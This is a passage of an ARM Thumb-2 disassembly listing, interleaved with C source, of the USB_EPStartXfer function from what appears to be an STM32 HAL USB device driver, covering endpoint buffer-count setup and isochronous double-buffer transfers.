 8007a52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a56:	681b      	ldr	r3, [r3, #0]
 8007a58:	691b      	ldr	r3, [r3, #16]
 8007a5a:	f003 0301 	and.w	r3, r3, #1
 8007a5e:	2b00      	cmp	r3, #0
 8007a60:	d004      	beq.n	8007a6c <USB_EPStartXfer+0x1062>
 8007a62:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a66:	3301      	adds	r3, #1
 8007a68:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a6c:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a70:	881b      	ldrh	r3, [r3, #0]
 8007a72:	b29a      	uxth	r2, r3
 8007a74:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a78:	b29b      	uxth	r3, r3
 8007a7a:	029b      	lsls	r3, r3, #10
 8007a7c:	b29b      	uxth	r3, r3
 8007a7e:	4313      	orrs	r3, r2
 8007a80:	b29a      	uxth	r2, r3
 8007a82:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a86:	801a      	strh	r2, [r3, #0]
 8007a88:	e034      	b.n	8007af4 <USB_EPStartXfer+0x10ea>
 8007a8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a92:	681b      	ldr	r3, [r3, #0]
 8007a94:	785b      	ldrb	r3, [r3, #1]
 8007a96:	2b01      	cmp	r3, #1
 8007a98:	d12c      	bne.n	8007af4 <USB_EPStartXfer+0x10ea>
 8007a9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a9e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007aa2:	681b      	ldr	r3, [r3, #0]
 8007aa4:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007aa8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aac:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ab0:	681b      	ldr	r3, [r3, #0]
 8007ab2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ab6:	b29b      	uxth	r3, r3
 8007ab8:	461a      	mov	r2, r3
 8007aba:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007abe:	4413      	add	r3, r2
 8007ac0:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ac4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ac8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007acc:	681b      	ldr	r3, [r3, #0]
 8007ace:	781b      	ldrb	r3, [r3, #0]
 8007ad0:	00da      	lsls	r2, r3, #3
 8007ad2:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007ad6:	4413      	add	r3, r2
 8007ad8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007adc:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007ae0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ae4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ae8:	681b      	ldr	r3, [r3, #0]
 8007aea:	691b      	ldr	r3, [r3, #16]
 8007aec:	b29a      	uxth	r2, r3
 8007aee:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007af2:	801a      	strh	r2, [r3, #0]
 8007af4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007af8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007afc:	681b      	ldr	r3, [r3, #0]
 8007afe:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007b02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b06:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b0a:	681b      	ldr	r3, [r3, #0]
 8007b0c:	785b      	ldrb	r3, [r3, #1]
 8007b0e:	2b00      	cmp	r3, #0
 8007b10:	f040 809d 	bne.w	8007c4e <USB_EPStartXfer+0x1244>
 8007b14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b18:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b1c:	681b      	ldr	r3, [r3, #0]
 8007b1e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b26:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b2a:	681b      	ldr	r3, [r3, #0]
 8007b2c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b30:	b29b      	uxth	r3, r3
 8007b32:	461a      	mov	r2, r3
 8007b34:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b38:	4413      	add	r3, r2
 8007b3a:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b46:	681b      	ldr	r3, [r3, #0]
 8007b48:	781b      	ldrb	r3, [r3, #0]
 8007b4a:	00da      	lsls	r2, r3, #3
 8007b4c:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b50:	4413      	add	r3, r2
 8007b52:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007b56:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007b5a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b5e:	881b      	ldrh	r3, [r3, #0]
 8007b60:	b29b      	uxth	r3, r3
 8007b62:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b66:	b29a      	uxth	r2, r3
 8007b68:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b6c:	801a      	strh	r2, [r3, #0]
 8007b6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b76:	681b      	ldr	r3, [r3, #0]
 8007b78:	691b      	ldr	r3, [r3, #16]
 8007b7a:	2b3e      	cmp	r3, #62	; 0x3e
 8007b7c:	d92b      	bls.n	8007bd6 <USB_EPStartXfer+0x11cc>
 8007b7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b86:	681b      	ldr	r3, [r3, #0]
 8007b88:	691b      	ldr	r3, [r3, #16]
 8007b8a:	095b      	lsrs	r3, r3, #5
 8007b8c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007b90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b98:	681b      	ldr	r3, [r3, #0]
 8007b9a:	691b      	ldr	r3, [r3, #16]
 8007b9c:	f003 031f 	and.w	r3, r3, #31
 8007ba0:	2b00      	cmp	r3, #0
 8007ba2:	d104      	bne.n	8007bae <USB_EPStartXfer+0x11a4>
 8007ba4:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007ba8:	3b01      	subs	r3, #1
 8007baa:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007bae:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bb2:	881b      	ldrh	r3, [r3, #0]
 8007bb4:	b29a      	uxth	r2, r3
 8007bb6:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bba:	b29b      	uxth	r3, r3
 8007bbc:	029b      	lsls	r3, r3, #10
 8007bbe:	b29b      	uxth	r3, r3
 8007bc0:	4313      	orrs	r3, r2
 8007bc2:	b29b      	uxth	r3, r3
 8007bc4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007bc8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bcc:	b29a      	uxth	r2, r3
 8007bce:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bd2:	801a      	strh	r2, [r3, #0]
 8007bd4:	e069      	b.n	8007caa <USB_EPStartXfer+0x12a0>
 8007bd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bda:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bde:	681b      	ldr	r3, [r3, #0]
 8007be0:	691b      	ldr	r3, [r3, #16]
 8007be2:	2b00      	cmp	r3, #0
 8007be4:	d10c      	bne.n	8007c00 <USB_EPStartXfer+0x11f6>
 8007be6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bea:	881b      	ldrh	r3, [r3, #0]
 8007bec:	b29b      	uxth	r3, r3
 8007bee:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007bf2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bf6:	b29a      	uxth	r2, r3
 8007bf8:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bfc:	801a      	strh	r2, [r3, #0]
 8007bfe:	e054      	b.n	8007caa <USB_EPStartXfer+0x12a0>
 8007c00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c08:	681b      	ldr	r3, [r3, #0]
 8007c0a:	691b      	ldr	r3, [r3, #16]
 8007c0c:	085b      	lsrs	r3, r3, #1
 8007c0e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c1a:	681b      	ldr	r3, [r3, #0]
 8007c1c:	691b      	ldr	r3, [r3, #16]
 8007c1e:	f003 0301 	and.w	r3, r3, #1
 8007c22:	2b00      	cmp	r3, #0
 8007c24:	d004      	beq.n	8007c30 <USB_EPStartXfer+0x1226>
 8007c26:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c2a:	3301      	adds	r3, #1
 8007c2c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c30:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c34:	881b      	ldrh	r3, [r3, #0]
 8007c36:	b29a      	uxth	r2, r3
 8007c38:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c3c:	b29b      	uxth	r3, r3
 8007c3e:	029b      	lsls	r3, r3, #10
 8007c40:	b29b      	uxth	r3, r3
 8007c42:	4313      	orrs	r3, r2
 8007c44:	b29a      	uxth	r2, r3
 8007c46:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c4a:	801a      	strh	r2, [r3, #0]
 8007c4c:	e02d      	b.n	8007caa <USB_EPStartXfer+0x12a0>
 8007c4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c56:	681b      	ldr	r3, [r3, #0]
 8007c58:	785b      	ldrb	r3, [r3, #1]
 8007c5a:	2b01      	cmp	r3, #1
 8007c5c:	d125      	bne.n	8007caa <USB_EPStartXfer+0x12a0>
 8007c5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c62:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c66:	681b      	ldr	r3, [r3, #0]
 8007c68:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c6c:	b29b      	uxth	r3, r3
 8007c6e:	461a      	mov	r2, r3
 8007c70:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c74:	4413      	add	r3, r2
 8007c76:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007c7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c82:	681b      	ldr	r3, [r3, #0]
 8007c84:	781b      	ldrb	r3, [r3, #0]
 8007c86:	00da      	lsls	r2, r3, #3
 8007c88:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c8c:	4413      	add	r3, r2
 8007c8e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007c92:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007c96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c9e:	681b      	ldr	r3, [r3, #0]
 8007ca0:	691b      	ldr	r3, [r3, #16]
 8007ca2:	b29a      	uxth	r2, r3
 8007ca4:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007ca8:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007caa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cb2:	681b      	ldr	r3, [r3, #0]
 8007cb4:	69db      	ldr	r3, [r3, #28]
 8007cb6:	2b00      	cmp	r3, #0
 8007cb8:	f000 8218 	beq.w	80080ec <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007cbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cc0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007cc4:	681a      	ldr	r2, [r3, #0]
 8007cc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cce:	681b      	ldr	r3, [r3, #0]
 8007cd0:	781b      	ldrb	r3, [r3, #0]
 8007cd2:	009b      	lsls	r3, r3, #2
 8007cd4:	4413      	add	r3, r2
 8007cd6:	881b      	ldrh	r3, [r3, #0]
 8007cd8:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cdc:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ce0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007ce4:	2b00      	cmp	r3, #0
 8007ce6:	d005      	beq.n	8007cf4 <USB_EPStartXfer+0x12ea>
 8007ce8:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cec:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007cf0:	2b00      	cmp	r3, #0
 8007cf2:	d10d      	bne.n	8007d10 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007cf4:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cf8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cfc:	2b00      	cmp	r3, #0
 8007cfe:	f040 81f5 	bne.w	80080ec <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d02:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d06:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d0a:	2b00      	cmp	r3, #0
 8007d0c:	f040 81ee 	bne.w	80080ec <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d14:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d18:	681a      	ldr	r2, [r3, #0]
 8007d1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d22:	681b      	ldr	r3, [r3, #0]
 8007d24:	781b      	ldrb	r3, [r3, #0]
 8007d26:	009b      	lsls	r3, r3, #2
 8007d28:	4413      	add	r3, r2
 8007d2a:	881b      	ldrh	r3, [r3, #0]
 8007d2c:	b29b      	uxth	r3, r3
 8007d2e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007d32:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007d36:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007d3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d42:	681a      	ldr	r2, [r3, #0]
 8007d44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d48:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d4c:	681b      	ldr	r3, [r3, #0]
 8007d4e:	781b      	ldrb	r3, [r3, #0]
 8007d50:	009b      	lsls	r3, r3, #2
 8007d52:	441a      	add	r2, r3
 8007d54:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007d58:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007d5c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007d60:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007d64:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007d68:	b29b      	uxth	r3, r3
 8007d6a:	8013      	strh	r3, [r2, #0]
 8007d6c:	e1be      	b.n	80080ec <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007d6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d76:	681b      	ldr	r3, [r3, #0]
 8007d78:	78db      	ldrb	r3, [r3, #3]
 8007d7a:	2b01      	cmp	r3, #1
 8007d7c:	f040 81b4 	bne.w	80080e8 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007d80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d88:	681b      	ldr	r3, [r3, #0]
 8007d8a:	699a      	ldr	r2, [r3, #24]
 8007d8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d90:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d94:	681b      	ldr	r3, [r3, #0]
 8007d96:	691b      	ldr	r3, [r3, #16]
 8007d98:	429a      	cmp	r2, r3
 8007d9a:	d917      	bls.n	8007dcc <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007d9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007da0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007da4:	681b      	ldr	r3, [r3, #0]
 8007da6:	691b      	ldr	r3, [r3, #16]
 8007da8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007dac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007db0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007db4:	681b      	ldr	r3, [r3, #0]
 8007db6:	699a      	ldr	r2, [r3, #24]
 8007db8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007dbc:	1ad2      	subs	r2, r2, r3
 8007dbe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc6:	681b      	ldr	r3, [r3, #0]
 8007dc8:	619a      	str	r2, [r3, #24]
 8007dca:	e00e      	b.n	8007dea <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007dcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dd4:	681b      	ldr	r3, [r3, #0]
 8007dd6:	699b      	ldr	r3, [r3, #24]
 8007dd8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007ddc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007de0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007de4:	681b      	ldr	r3, [r3, #0]
 8007de6:	2200      	movs	r2, #0
 8007de8:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007dea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df2:	681b      	ldr	r3, [r3, #0]
 8007df4:	785b      	ldrb	r3, [r3, #1]
 8007df6:	2b00      	cmp	r3, #0
 8007df8:	f040 8085 	bne.w	8007f06 <USB_EPStartXfer+0x14fc>
 8007dfc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e00:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e04:	681b      	ldr	r3, [r3, #0]
 8007e06:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e0e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e12:	681b      	ldr	r3, [r3, #0]
 8007e14:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e18:	b29b      	uxth	r3, r3
 8007e1a:	461a      	mov	r2, r3
 8007e1c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e20:	4413      	add	r3, r2
 8007e22:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e2e:	681b      	ldr	r3, [r3, #0]
 8007e30:	781b      	ldrb	r3, [r3, #0]
 8007e32:	00da      	lsls	r2, r3, #3
 8007e34:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e38:	4413      	add	r3, r2
 8007e3a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007e3e:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007e42:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e46:	881b      	ldrh	r3, [r3, #0]
 8007e48:	b29b      	uxth	r3, r3
 8007e4a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007e4e:	b29a      	uxth	r2, r3
 8007e50:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e54:	801a      	strh	r2, [r3, #0]
 8007e56:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e5a:	2b3e      	cmp	r3, #62	; 0x3e
 8007e5c:	d923      	bls.n	8007ea6 <USB_EPStartXfer+0x149c>
 8007e5e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e62:	095b      	lsrs	r3, r3, #5
 8007e64:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e68:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e6c:	f003 031f 	and.w	r3, r3, #31
 8007e70:	2b00      	cmp	r3, #0
 8007e72:	d104      	bne.n	8007e7e <USB_EPStartXfer+0x1474>
 8007e74:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e78:	3b01      	subs	r3, #1
 8007e7a:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e7e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e82:	881b      	ldrh	r3, [r3, #0]
 8007e84:	b29a      	uxth	r2, r3
 8007e86:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e8a:	b29b      	uxth	r3, r3
 8007e8c:	029b      	lsls	r3, r3, #10
 8007e8e:	b29b      	uxth	r3, r3
 8007e90:	4313      	orrs	r3, r2
 8007e92:	b29b      	uxth	r3, r3
 8007e94:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e98:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e9c:	b29a      	uxth	r2, r3
 8007e9e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ea2:	801a      	strh	r2, [r3, #0]
 8007ea4:	e060      	b.n	8007f68 <USB_EPStartXfer+0x155e>
 8007ea6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eaa:	2b00      	cmp	r3, #0
 8007eac:	d10c      	bne.n	8007ec8 <USB_EPStartXfer+0x14be>
 8007eae:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007eb2:	881b      	ldrh	r3, [r3, #0]
 8007eb4:	b29b      	uxth	r3, r3
 8007eb6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007eba:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ebe:	b29a      	uxth	r2, r3
 8007ec0:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ec4:	801a      	strh	r2, [r3, #0]
 8007ec6:	e04f      	b.n	8007f68 <USB_EPStartXfer+0x155e>
 8007ec8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ecc:	085b      	lsrs	r3, r3, #1
 8007ece:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ed2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ed6:	f003 0301 	and.w	r3, r3, #1
 8007eda:	2b00      	cmp	r3, #0
 8007edc:	d004      	beq.n	8007ee8 <USB_EPStartXfer+0x14de>
 8007ede:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ee2:	3301      	adds	r3, #1
 8007ee4:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ee8:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007eec:	881b      	ldrh	r3, [r3, #0]
 8007eee:	b29a      	uxth	r2, r3
 8007ef0:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ef4:	b29b      	uxth	r3, r3
 8007ef6:	029b      	lsls	r3, r3, #10
 8007ef8:	b29b      	uxth	r3, r3
 8007efa:	4313      	orrs	r3, r2
 8007efc:	b29a      	uxth	r2, r3
 8007efe:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f02:	801a      	strh	r2, [r3, #0]
 8007f04:	e030      	b.n	8007f68 <USB_EPStartXfer+0x155e>
 8007f06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f0e:	681b      	ldr	r3, [r3, #0]
 8007f10:	785b      	ldrb	r3, [r3, #1]
 8007f12:	2b01      	cmp	r3, #1
 8007f14:	d128      	bne.n	8007f68 <USB_EPStartXfer+0x155e>
 8007f16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f1a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f1e:	681b      	ldr	r3, [r3, #0]
 8007f20:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f28:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f2c:	681b      	ldr	r3, [r3, #0]
 8007f2e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f32:	b29b      	uxth	r3, r3
 8007f34:	461a      	mov	r2, r3
 8007f36:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f3a:	4413      	add	r3, r2
 8007f3c:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f48:	681b      	ldr	r3, [r3, #0]
 8007f4a:	781b      	ldrb	r3, [r3, #0]
 8007f4c:	00da      	lsls	r2, r3, #3
 8007f4e:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f52:	4413      	add	r3, r2
 8007f54:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007f58:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007f5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f60:	b29a      	uxth	r2, r3
 8007f62:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007f66:	801a      	strh	r2, [r3, #0]
 8007f68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f6c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f70:	681b      	ldr	r3, [r3, #0]
 8007f72:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007f76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f7e:	681b      	ldr	r3, [r3, #0]
 8007f80:	785b      	ldrb	r3, [r3, #1]
 8007f82:	2b00      	cmp	r3, #0
 8007f84:	f040 8085 	bne.w	8008092 <USB_EPStartXfer+0x1688>
 8007f88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f8c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f90:	681b      	ldr	r3, [r3, #0]
 8007f92:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007f96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f9a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f9e:	681b      	ldr	r3, [r3, #0]
 8007fa0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007fa4:	b29b      	uxth	r3, r3
